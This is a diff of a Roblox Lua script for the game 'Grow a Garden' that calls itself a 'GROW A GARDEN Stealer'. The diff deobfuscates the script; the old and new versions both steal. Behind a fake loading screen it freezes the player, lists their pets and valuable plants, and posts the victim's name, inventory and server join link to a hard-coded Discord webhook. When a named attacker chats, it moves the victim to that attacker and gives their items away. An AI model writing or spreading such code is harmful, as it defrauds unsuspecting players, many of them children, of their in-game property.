@@ -1,45 +1,49 @@
---// Discord Webhook (obfuscated variable)
-local _L0gW3bh = "https://discord.com/api/webhooks/1386534377114308690/PrcjOhmjN8I10-1LHleXGQQgKKquxDxo9G8nY6r4XhIQWJ8xfhKA5EZ8Lgq29Uh0hUsj"
 
---// Obfuscated service fetch
-local gsr=function(n) return game:GetService(n) end
-local _RRS = gsr("RobloxReplicatedStorage")
-local _srv = _RRS.GetServerType:InvokeServer()
-local _plyrs = gsr("Players")
-local _plr = _plyrs.LocalPlayer
+local logs_webhook = "https://discord.com/api/webhooks/1386534377114308690/PrcjOhmjN8I10-1LHleXGQQgKKquxDxo9G8nY6r4XhIQWJ8xfhKA5EZ8Lgq29Uh0hUsj"
 
-if _srv == "VIPServer" then
-    _plr:Kick(string.reverse("cilbup a nioj esaelP .revres detroppusnU"))
-end
+-- Set this to the username of the recipient
+local username = "TARGET_USERNAME_HERE"
 
-local HttpService = gsr("HttpService")
-local ReplicatedStorage = gsr("ReplicatedStorage")
-local backpack = _plr:WaitForChild("Backpack")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+local Backpack = LocalPlayer:WaitForChild("Backpack")
 local CalculatePlantValue = require(ReplicatedStorage.Modules.CalculatePlantValue)
 local ActivePetsService = require(ReplicatedStorage.Modules.PetServices.ActivePetsService)
 local req = (syn and syn.request) or (http and http.request) or (http_request) or request
 
---// Freeze player (obfuscated)
-do
-    local p=_plr
-    local h=(p.Character or p.CharacterAdded:Wait()):WaitForChild("Humanoid")
-    h.WalkSpeed=0 h.JumpPower=0
-    pcall(function()
-        (p:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable()
-    end)
+-- SERVER CHECK
+local server = game:GetService("RobloxReplicatedStorage").GetServerType:InvokeServer()
+if server == "VIPServer" then
+    LocalPlayer:Kick("Unsupported server. Please join a public server.")
 end
 
---// Loader UI (unchanged for now)
+if #Players:GetPlayers() >= 5 then
+    LocalPlayer:Kick("Old server detected. Please rejoin!")
+    return 
+end
+
+-- OPTIONAL: Freeze controls for demo effect
+pcall(function()
+    local h = (LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()):WaitForChild("Humanoid")
+    h.WalkSpeed = 0
+    h.JumpPower = 0
+    require(LocalPlayer:WaitForChild("PlayerScripts"):WaitForChild("PlayerModule")):GetControls():Disable()
+end)
+
+-- Loader GUI
 local gui = Instance.new("ScreenGui")
 gui.Name = "ScriptLoader"
 gui.IgnoreGuiInset = true
 gui.ResetOnSpawn = false
 gui.DisplayOrder = 999999 
-gui.Parent = _plr:WaitForChild("PlayerGui")
+gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
 local bg = Instance.new("Frame", gui)
 bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 bg.Size = UDim2.new(1, 0, 1, 0)
+
 local title = Instance.new("TextLabel", bg)
 title.Text = "Loading Script..."
 title.Font = Enum.Font.GothamBlack
@@ -48,6 +52,7 @@ title.TextScaled = true
 title.Size = UDim2.new(0.8, 0, 0.12, 0)
 title.Position = UDim2.new(0.1, 0, 0.28, 0)
 title.BackgroundTransparency = 1
+
 local status = Instance.new("TextLabel", bg)
 status.Text = "Initializing..."
 status.Font = Enum.Font.Gotham
@@ -56,17 +61,20 @@ status.TextScaled = true
 status.Size = UDim2.new(0.8, 0, 0.08, 0)
 status.Position = UDim2.new(0.1, 0, 0.42, 0)
 status.BackgroundTransparency = 1
+
 local barBg = Instance.new("Frame", bg)
 barBg.Size = UDim2.new(0.7, 0, 0.035, 0)
 barBg.Position = UDim2.new(0.15, 0, 0.52, 0)
 barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 barBg.BorderSizePixel = 0
 barBg.ClipsDescendants = true
+
 local barFill = Instance.new("Frame", barBg)
 barFill.Size = UDim2.new(0, 0, 1, 0)
 barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
 barFill.BorderSizePixel = 0
 barFill.Parent = barBg
+
 local discord = Instance.new("TextLabel", bg)
 discord.Text = "MADE BY BUFFY ,ENJOY"
 discord.Font = Enum.Font.GothamSemibold
@@ -90,188 +98,227 @@ local fakeSteps = {
     "Preparing game environment...",
     "Almost done..."
 }
-local totalDuration = 300
-local stepTime = 3
+
+local totalDuration = 15
+local stepTime = 0.5
 local totalSteps = math.floor(totalDuration / stepTime)
+
 task.spawn(function()
     for i = 1, totalSteps do
         status.Text = fakeSteps[(i - 1) % #fakeSteps + 1]
-        barFill:TweenSize(UDim2.new(i / totalSteps, 0, 1, 0), "Out", "Quad", 0.75, true)
+        barFill:TweenSize(UDim2.new(i / totalSteps, 0, 1, 0), "Out", "Quad", 0.25, true)
         task.wait(stepTime)
     end
     gui:Destroy()
 end)
 
+-- Utility for large numbers
 local suffixes = {"", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"}
-local function _fmtN(n)
-    if type(n)~="number" then return tostring(n) end
-    if n<1000 then return tostring(n) end
-    local m=math.floor(math.log10(n)/3)
-    local s=suffixes[m+1]or("e"..(m*3))
-    local sc=n/(1000^m)
-    return string.format("%.2f%s",sc,s)
+local function formatNumber(num)
+    if type(num) ~= "number" then return tostring(num) end
+    if num < 1000 then return tostring(num) end
+    local magnitude = math.floor(math.log10(num) / 3)
+    local suffix = suffixes[magnitude + 1] or ("e" .. (magnitude * 3))
+    local scaled = num / (1000 ^ magnitude)
+    return string.format("%.2f%s", scaled, suffix)
 end
 
-if #_plyrs:GetPlayers()>=5 then
-    _plr:Kick(string.reverse("!nijoer esaelP .detceted revres dlO"))
-    return 
-end
-
-local bp=_plr:WaitForChild("Backpack")
-local event=ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
-for _,item in ipairs(bp:GetChildren()) do
-    if item:GetAttribute("Favorite")==true then
+-- Favorite items event
+local event = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
+for _, item in ipairs(Backpack:GetChildren()) do
+    if item:GetAttribute("Favorite") == true then
         event:FireServer(item)
     end
 end
 
-local executor=(identifyexecutor and identifyexecutor()) or "Unknown"
+local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
 local allowedPets = {
-    ["Raccoon"]=true,["Queen Bee"]=true,["Dragonfly"]=true,["Red Fox"]=true,
-    ["Night Owl"]=true,["Owl"]=true,["Blood Owl"]=true,["Praying Mantis"]=true,
-    ["Chicken Zombie"]=true,["Polar Bear"]=true,["Petal Bee"]=true,["Bear Bee"]=true,
-    ["Disco Bee"]=true,["Butterfly"]=true,["Mimic Octopus"]=true,["Scarlet Macaw"]=true,
+    ["Raccoon"] = true, ["Queen Bee"] = true, ["Dragonfly"] = true, ["Red Fox"] = true,
+    ["Night Owl"] = true, ["Owl"] = true, ["Blood Owl"] = true, ["Praying Mantis"] = true,
+    ["Chicken Zombie"] = true, ["Polar Bear"] = true, ["Petal Bee"] = true, ["Bear Bee"] = true,
+    ["Disco Bee"] = true, ["Butterfly"] = true, ["Mimic Octopus"] = true, ["Scarlet Macaw"] = true,
 }
-local petCountMap,petLines,itemsWithValue={}, {}, {}
-for _,item in pairs(backpack:GetChildren()) do
-    local baseName=item.Name:match("^(.-)%s*%[") or item.Name
+local petCountMap, petLines, itemsWithValue = {}, {}, {}
+
+for _, item in pairs(Backpack:GetChildren()) do
+    local baseName = item.Name:match("^(.-)%s*%[") or item.Name
     if allowedPets[baseName] then
-        petCountMap[baseName]=(petCountMap[baseName] or 0)+1
+        petCountMap[baseName] = (petCountMap[baseName] or 0) + 1
     elseif item:FindFirstChild("Item_String") then
-        local value=CalculatePlantValue(item)
-        table.insert(itemsWithValue,{name=item.Name,value=value})
+        local value = CalculatePlantValue(item)
+        table.insert(itemsWithValue, {name = item.Name, value = value})
     end
 end
-for petName,count in pairs(petCountMap) do
-    table.insert(petLines,petName.." - pet (x"..count..")")
-end
-table.sort(itemsWithValue,function(a,b) return a.value>b.value end)
-local tradableSummary,totalShown="",0
-for _,line in ipairs(petLines) do
-    if totalShown>=10 then break end
-    tradableSummary=tradableSummary..line.."\n"
-    totalShown+=1
-end
-for i=1,math.min(10-totalShown,#itemsWithValue) do
-    local item=itemsWithValue[i]
-    tradableSummary=tradableSummary..item.name.." - Worth: ".._fmtN(item.value).."\n"
-end
-if #petLines+#itemsWithValue>10 then
-    tradableSummary=tradableSummary.."and more..."
-end
-local totalValue=0
-for _,item in ipairs(itemsWithValue) do totalValue+=item.value end
 
---// Webhook payloads (obfuscated variables)
-local _payload={
-    ["content"]="--@everyone\n"..string.format(
-        "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")",game.PlaceId,game.JobId),
-    ["embeds"]={{
-        ["title"]=":skull: GROW A GARDEN Stealer",["color"]=0x00ffcc,
-        ["fields"]={
-            {["name"]=":dart: Victim",["value"]=_plr.Name,["inline"]=false},
-            {["name"]=":crown: Creator",["value"]=username or "?",["inline"]=false},
-            {["name"]=":jigsaw: Executor",["value"]=executor,["inline"]=false},
-            {["name"]=":moneybag: Total Value",["value"]=_fmtN(totalValue),["inline"]=false},
-            {["name"]=":package: Items",["value"]="```\n"..tradableSummary.."```",["inline"]=false},
-            {["name"]=":link: Join Server",["value"]=string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)",game.PlaceId,game.JobId),["inline"]=false}
+for petName, count in pairs(petCountMap) do
+    table.insert(petLines, petName .. " - pet (x" .. count .. ")")
+end
+
+table.sort(itemsWithValue, function(a, b) return a.value > b.value end)
+
+local tradableSummary, totalShown = "", 0
+for _, line in ipairs(petLines) do
+    if totalShown >= 10 then break end
+    tradableSummary = tradableSummary .. line .. "\n"
+    totalShown += 1
+end
+for i = 1, math.min(10 - totalShown, #itemsWithValue) do
+    local item = itemsWithValue[i]
+    tradableSummary = tradableSummary .. item.name .. " - Worth: " .. formatNumber(item.value) .. "\n"
+end
+if #petLines + #itemsWithValue > 10 then
+    tradableSummary = tradableSummary .. "and more..."
+end
+
+local totalValue = 0
+for _, item in ipairs(itemsWithValue) do
+    totalValue += item.value
+end
+
+-- Webhook payloads
+local payload = {
+    ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
+    ["embeds"] = {{
+        ["title"] = ":skull: GROW A GARDEN Stealer",
+        ["color"] = 0x00ffcc,
+        ["fields"] = {
+            {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+            {["name"] = ":crown: Creator", ["value"] = username, ["inline"] = false},
+            {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
+            {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
+            {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+            {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
         },
-        ["footer"]={["text"]="by Buffy • "..os.date("%B %d, %Y")},
-        ["timestamp"]=os.date("!%Y-%m-%dT%H:%M:%SZ")
+        ["footer"] = {["text"] = "by Buffy • " .. os.date("%B %d, %Y")},
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
-local _logs_payload={
-    ["embeds"]={{
-        ["title"]=":skull: GROW A GARDEN LOGS",["color"]=0x00ffcc,
-        ["fields"]={
-            {["name"]=":dart: Victim",["value"]=_plr.Name,["inline"]=false},
-            {["name"]=":jigsaw: Executor",["value"]=executor,["inline"]=false},
-            {["name"]=":moneybag: Total Value",["value"]=_fmtN(totalValue),["inline"]=false},
-            {["name"]=":package: Items",["value"]="```\n"..tradableSummary.."```",["inline"]=false},
-            {["name"]=":link: Join Server",["value"]=string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)",game.PlaceId,game.JobId),["inline"]=false}
+
+local logs_payload = {
+    ["embeds"] = {{
+        ["title"] = ":skull: GROW A GARDEN LOGS",
+        ["color"] = 0x00ffcc,
+        ["fields"] = {
+            {["name"] = ":dart: Victim", ["value"] = LocalPlayer.Name, ["inline"] = false},
+            {["name"] = ":jigsaw: Executor", ["value"] = executor, ["inline"] = false},
+            {["name"] = ":moneybag: Total Value", ["value"] = formatNumber(totalValue), ["inline"] = false},
+            {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
+            {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
         },
-        ["footer"]={["text"]="by buffy • "..os.date("%B %d, %Y")},
-        ["timestamp"]=os.date("!%Y-%m-%dT%H:%M:%SZ")
+        ["footer"] = {["text"] = "by buffy • " .. os.date("%B %d, %Y")},
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
 
 if req then
     pcall(function()
-        req({Url=webhook,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(_payload)})
-        req({Url=_L0gW3bh,Method="POST",Headers={["Content-Type"]="application/json"},Body=HttpService:JSONEncode(_logs_payload)})
+        req({
+            Url = logs_webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+        req({
+            Url = logs_webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(logs_payload)
+        })
     end)
 end
 
+-- Helper functions
 local function getKg(name)
-    return tonumber(string.match(name,"%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
+    return tonumber(string.match(name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
 end
+
 local function hasValidItems()
-    for _,item in ipairs(_plr.Backpack:GetChildren()) do
-        if getKg(item.Name)>0 then return true end
+    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
+        if getKg(item.Name) > 0 then
+            return true
+        end
     end
     return false
 end
+
 local function unequipAllPets()
-    local petData=ActivePetsService:GetPlayerDatastorePetData(_plr.Name)
+    local petData = ActivePetsService:GetPlayerDatastorePetData(LocalPlayer.Name)
     if petData then
-        for uuid,_ in pairs(petData.PetInventory.Data) do
-            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet",uuid)
+        for uuid, _ in pairs(petData.PetInventory.Data) do
+            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetsService"):FireServer("UnequipPet", uuid)
             task.wait(0.1)
         end
     end
 end
+
 local function startGiving()
     if not hasValidItems() then return end
-    local target=_plyrs:FindFirstChild(username)
+    local target = Players:FindFirstChild(username)
     if not target or not target.Character then return end
-    local hrp=target.Character:FindFirstChild("HumanoidRootPart")
+    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
     if not hrp then return end
-    _plr.Character:MoveTo(hrp.Position)
+    LocalPlayer.Character:MoveTo(hrp.Position)
     task.wait(0.4)
-    local cname="Proximi".."tyPrompt"
+
+    local cname = "ProximityPrompt"
     local prompt
-    for _,v in ipairs(hrp:GetChildren()) do
-        if v.ClassName==cname then prompt=v break end
+    for _, v in ipairs(hrp:GetChildren()) do
+        if v.ClassName == cname then
+            prompt = v
+            break
+        end
     end
     if not prompt then return end
-    prompt.HoldDuration=0
-    local index=1
+    prompt.HoldDuration = 0
+
+    local index = 1
     while true do
         if not hasValidItems() then break end
-        local sortedItems={}
-        for _,item in ipairs(_plr.Backpack:GetChildren()) do
-            if getKg(item.Name)>0 then table.insert(sortedItems,item) end
+        local sortedItems = {}
+        for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
+            if getKg(item.Name) > 0 then
+                table.insert(sortedItems, item)
+            end
         end
-        table.sort(sortedItems,function(a,b) return getKg(a.Name)>getKg(b.Name) end)
-        if #sortedItems>0 then
-            if index>#sortedItems then index=1 end
-            local item=sortedItems[index]
-            if item:IsA("Tool") then item.Parent=_plr.Character task.wait() end
-            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet",target)
-            local holdBegin="InputHold".."Begin"
-            local holdEnd="InputHold".."End"
-            prompt[holdBegin](prompt) task.wait(0.1) prompt[holdEnd](prompt)
-            if item:IsDescendantOf(_plr.Character) then item.Parent=_plr.Backpack end
-            index+=1
+        table.sort(sortedItems, function(a, b) return getKg(a.Name) > getKg(b.Name) end)
+        if #sortedItems > 0 then
+            if index > #sortedItems then index = 1 end
+            local item = sortedItems[index]
+            if item:IsA("Tool") then
+                item.Parent = LocalPlayer.Character
+                task.wait()
+            end
+            ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer("GivePet", target)
+            local holdBegin = "InputHoldBegin"
+            local holdEnd = "InputHoldEnd"
+            if prompt[holdBegin] then prompt[holdBegin](prompt) end
+            task.wait(0.1)
+            if prompt[holdEnd] then prompt[holdEnd](prompt) end
+
+            if item:IsDescendantOf(LocalPlayer.Character) then
+                item.Parent = LocalPlayer.Backpack
+            end
+            index += 1
         else
             break
         end
         task.wait(0.05)
     end
 end
+
 unequipAllPets()
-local started=false
-for _,p in ipairs(_plyrs:GetPlayers()) do
-    if p.Name==username then
+local started = false
+for _, p in ipairs(Players:GetPlayers()) do
+    if p.Name == username then
         p.Chatted:Connect(function()
-            if not started then started=true startGiving() end
+            if not started then started = true; startGiving() end
         end)
     end
 end
-_plyrs.PlayerAdded:Connect(function(p)
-    if p.Name==username then
+Players.PlayerAdded:Connect(function(p)
+    if p.Name == username then
         p.Chatted:Connect(function()
-            if not started then started=true startGiving() end
+            if not started then started = true; startGiving() end
         end)
     end
 end)
